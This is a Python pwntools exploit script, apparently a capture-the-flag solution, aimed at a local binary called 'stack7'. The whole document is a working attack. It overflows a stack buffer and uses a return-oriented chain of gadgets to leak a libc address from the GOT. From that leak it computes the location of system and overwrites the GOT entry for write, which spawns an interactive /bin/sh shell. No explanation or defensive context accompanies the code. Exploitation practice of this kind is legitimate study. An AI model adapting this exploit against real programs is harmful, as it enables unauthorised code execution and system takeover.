from pwn import *

p = process('./stack7')

gadget1 = 0x401200
gadget2 = 0x40121a
pop_rdi_ret = 0x401223

write_got = 0x404018
read_got = 0x404028
write_plt = 0x401060

payload = b'A' * 0x48
payload += p64(gadget2)
payload += p64(0)
payload += p64(1)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(write_got)
payload += p64(gadget1)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(0)
payload += p64(write_got)
payload += p64(16)
payload += p64(read_got)
payload += p64(gadget1)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(write_got + 8)
payload += p64(write_plt)

p.send(payload)
write_libc = u64(p.recv()[-8:])
libc_base = write_libc - 0x10e280
system_libc = libc_base + 0x52290

print('write_libc:', hex(write_libc))
print('libc_base:', hex(libc_base))
print('system_libc:', hex(system_libc))

payload2 = p64(system_libc)
payload2 += b'/bin/sh\x00'
p.send(payload2)

p.interactive()
